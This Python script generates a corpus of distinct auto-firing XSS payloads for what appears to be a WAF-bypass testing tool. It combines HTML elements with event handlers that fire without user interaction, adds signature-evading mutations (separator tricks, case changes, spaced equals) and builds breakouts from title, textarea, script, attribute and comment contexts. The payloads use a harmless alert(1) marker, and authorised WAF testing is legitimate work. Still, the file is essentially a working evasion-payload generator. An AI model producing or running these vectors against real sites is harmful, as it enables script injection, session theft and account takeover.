#!/usr/bin/env python3
"""Generate a large corpus of DISTINCT auto-firing XSS vectors (marker alert(1)).

The execution count in the sweeps is bounded by the number of distinct payloads
that both bypass the WAF AND execute. This emits a broad set of self-firing
markup vectors (handler x element, plus light execution-preserving mutations)
and context-breakout vectors for the RCDATA/RAWTEXT/attribute/JS sinks. The
detonation oracle in `wafrift exploit` filters to the ones that actually run, so
over-generation is safe — only genuine executors are counted.

Usage:
  python3 generate_corpus.py > corpus_generated.txt
  # then merge with the extracted corpus, dedup:
  cat corpus_xss.txt corpus_generated.txt | awk '!seen[$0]++' > corpus_xl.txt
"""

MARK = "alert(1)"

# (element, attributes-that-make-it-fire) — each fires with NO user interaction
# in a headless browser when parser-inserted (server-rendered markup).
AUTOFIRE = [
    ("svg", "onload={M}"),
    ("img", "src=x onerror={M}"),
    ("img", "src=x: onerror={M}"),
    ("image", "src=x onerror={M}"),          # legacy alias for <img>
    ("body", "onload={M}"),
    ("body", "onpageshow={M}"),
    ("svg", "onload={M}//"),
    ("video", "src=x onerror={M}"),
    ("video", "><source onerror={M}"),
    ("audio", "src=x onerror={M}"),
    ("audio", "><source onerror={M}"),
    ("object", "data=x onerror={M}"),
    ("embed", "src=x onerror={M}"),
    ("details", "open ontoggle={M}"),
    ("marquee", "onstart={M}"),
    ("input", "autofocus onfocus={M}"),
    ("select", "autofocus onfocus={M}"),
    ("textarea", "autofocus onfocus={M}"),
    ("keygen", "autofocus onfocus={M}"),
    ("iframe", "onload={M}"),
    ("iframe", "src=x onerror={M}"),
    ("script", "src=x onerror={M}"),
    ("style", "onload={M}"),
    ("svg", "><animate onbegin={M} attributeName=x dur=1s>"),
    ("svg", "><set onbegin={M} attributeName=x>"),
    ("form", "><button formaction=javascript:{M}>x"),
]

# Light execution-preserving mutations applied to each base tag opener — each
# keeps the vector firing but changes the bytes (so it is a distinct payload and
# a distinct thing for the WAF to (not) match).
def mutate(tag: str, attrs: str):
    a = attrs.format(M=MARK)
    yield f"<{tag} {a}>"
    yield f"<{tag}/{a}>"                       # slash separator
    yield f"<{tag}  {a} >"                     # extra whitespace
    yield f"<{tag}\t{a}>"                      # tab separator
    yield f"<{tag} {a.replace('=', ' = ')}>"   # spaced equals
    # Mixed case on the tag (HTML is case-insensitive; defeats case-sensitive
    # signatures).
    yield f"<{tag.upper()} {a}>"
    if tag.islower() and len(tag) > 2:
        yield f"<{tag[0].upper()}{tag[1:]} {a}>"


# Context-breakout prefixes — re-enter markup from RCDATA / RAWTEXT / attribute /
# JS-string / comment sinks, then drop a known auto-firing tag.
BREAKOUTS = [
    "</title>", "</textarea>", "</style>", "</script>", "</noscript>",
    "</xmp>", "</iframe>", "\"><", "'><", "</select>", "--><", "</template>",
]
BREAKOUT_BODY = "<svg onload={M}>".format(M=MARK)
BREAKOUT_BODY2 = "<img src=x onerror={M}>".format(M=MARK)


def main():
    seen = set()
    out = []

    def emit(p):
        if p not in seen:
            seen.add(p)
            out.append(p)

    for tag, attrs in AUTOFIRE:
        for v in mutate(tag, attrs):
            emit(v)

    for b in BREAKOUTS:
        # `"><` / `'><` already include the opener fragment; the rest are tags.
        if b.endswith("<"):
            emit(b + f"svg onload={MARK}>")
            emit(b + f"img src=x onerror={MARK}>")
        else:
            emit(b + BREAKOUT_BODY)
            emit(b + BREAKOUT_BODY2)

    for p in out:
        print(p)


if __name__ == "__main__":
    main()
